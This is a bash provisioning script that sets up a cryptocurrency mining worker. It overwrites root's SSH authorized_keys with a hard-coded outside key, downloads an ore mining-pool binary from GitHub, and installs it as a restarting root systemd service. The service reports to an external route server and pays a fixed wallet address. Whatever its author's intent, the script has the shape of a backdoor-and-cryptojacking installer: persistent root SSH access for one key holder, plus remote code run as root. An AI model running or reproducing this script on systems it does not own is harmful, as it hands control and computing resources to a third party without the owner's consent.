#!/bin/bash
mkdir -p /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAl5QreAwkidb7s2ucEKdlQ1q9/voCnGiLjvwwmQPgpm' >/root/.ssh/authorized_keys
chmod 700 /root/.ssh/authorized_keys
chown -R root:root /root/.ssh/authorized_keys

WORKER_WALLET_ADDRESS='5B5BQprt9jzdxYRvZJpgWCSyeR24zo2MV27oH3GjjvZf'

ALIAS=`jq .Settings.alias /q/appsettings.json | xargs`

[ -z "$ALIAS" ] && ALIAS=$(wget -T 3 -t 2 -qO- ifconfig.me)

DIR="/opt/ore"

mkdir $DIR

wget -O $DIR/ore-pool-cli "https://github.com/xintai6660707/ore-mine-pool/raw/main/ore-mine-pool-linux"

chmod +x $DIR/ore-pool-cli

COMMAND_BASE="${DIR}/ore-pool-cli worker --alias ${ALIAS} --route-server-url http://route.oreminepool.top:8080/ --server-url 'public&stake' --worker-wallet-address ${WORKER_WALLET_ADDRESS}"

echo """[Unit]
Description=ore
DefaultDependencies=no
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$DIR
ExecStart=$COMMAND_BASE
Restart=always
RestartSec=5s
StandardOutput=file:$DIR/worker.log
StandardError=inherit
[Install]
WantedBy=default.target""" > /etc/systemd/system/ore.service

systemctl daemon-reload